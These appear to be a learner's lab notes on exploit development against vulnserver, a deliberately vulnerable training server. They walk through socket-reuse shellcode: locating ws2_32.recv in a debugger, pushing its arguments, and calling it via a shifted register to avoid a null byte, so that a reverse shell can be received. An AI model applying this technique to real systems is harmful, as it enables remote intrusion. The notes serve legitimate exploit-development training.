recv function:
https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv

SOCKET s, --> Socket file descriptor
char *buf --> Pointer to the payload for this recv function.
int len   --> length of the payload we're sending
int flags --> integerer for flags

We will need all of these in order to reuse/make a 2nd call to ws2_32.recv.
----------------
----------------

We want to reuse the socket file descriptor for vulnserver.

1) Restart vulnserver, you'll be at the program entry point, and just scroll to see calls to ws32.
        - This could be any of them, accept, send, receive, etc.

2) Note the address down.
      Example: 00401953 CALL <JMP.&32_32.recv> | recv

Now see from the MSDN, on vulnserver, we want to see what these variables look like during a normal operation
  Of this binary

3) Set a breakpoint at recv, and then telnet into it.
 
We hit our breakpoint, and if we look at the stack we see what the recv syntax is!
    - Socket - 84             --> Socket file descriptor of 84.
    - Buffer = 003E4A80       --> Buffer destination pointer
    - BufSize = 1000 (4096.)  --> Buffer length of 4,096 bytes.
    - Flags = 0
    
4) Note all of this down.

We need push these arguments to the call in reverse order, then push them onto the stack, then make the call to recv.

5) Task 1, push 0 onto the stack (Flags)
    XOR EAX, EAX
    PUSH EAX
    
6) Task 2, Push the length of our input: (1000, this is enough space for our reverse shell)
    XOR EAX, EAX
    ADD AH, 10 
    PUSH EAX
    
 Task 3, Push the buffer descriptor pointer.
        We will likely need to find out where the buffer is stored, or if we can create a new one.
        In this case, we'll need to reference the old one.
                - I'm not sure when we should be doing one over the other.
               
 Look at the stack, set an address as the new buffer, and then reuse the socket descriptor from earlier.

7) We need to adjust the stack pointer, we can place that into EAX for us to do so.
        PUSH ESP
        POP EAX

8) We need adjust where we want ESP to go, we can do this in eax.
       - Where is ESP pointing to now? (A) Example: 00B8FA04
       - Where do we want it to point to? (B) Example: 00B8FA1C
     Calculate the space between these two memories:
        24 bytes, 0x18 hex.
        PUSH EAX
        
    This will make the destination buffer for the next recv at the end of our small buffer of C's.
   
Now we need a socket description.

Socket descriptor might not be the same every time the program runs, this could change, and could be affected by ASLR.
So we want a dynamic way to figure out what we want this socket descriptor is.

9.a) Figure out where the old one was. Figure this out by guessing and scrolling.
        We're looking for the old socket descriptor which we know had the value 84.
        Found in, in the stack it shows 00000084
        Calculate the distance between what's currently in EAX, and where the old socket descriptor you found is.
        Turn that into assembly
        
OR INSTEAD OF #9.a:

9.b) If the socket descriptor is already stored in the registers (for example this is in EBX), just push it.
        PUSH EBX
        
Now we need to find the actual call to recv, which the call at the address we saw is not the real call.
        We have to actually follow the jump. 
        
11) Set a breakpoint at our CALL <JMP.&w32_32.recv> as we found in #2.
12) Telnet into vulnserver
 
13) Click F7, this is where the actuall call to recv is located. 

14) Copy this address
        Example: 0040252C | JMP DWORD PTR DS:[<&W32_32.recv>[   | ws2_32.recv
                
15) Trial run:
        Run through your code and make sure all of the arguments for recv are passed onto the stack correctly.
        
16) We need to find a way to pass a call instruction to the address that we found for recv (#14)
        Problem! This address starts with a null byte.
        We're going to load tthe first 3 bytes into a register,
        then we're going to perform a shift right on this.
        
        We can do 40252C + some random values after, so when it shifts right it won't matter.
        
        XOR EAX, EAX
        add eax, 40252C90
        shr eax, 0x8
        
As you see, now the call to recv is in EAX.

17)     call eax
        
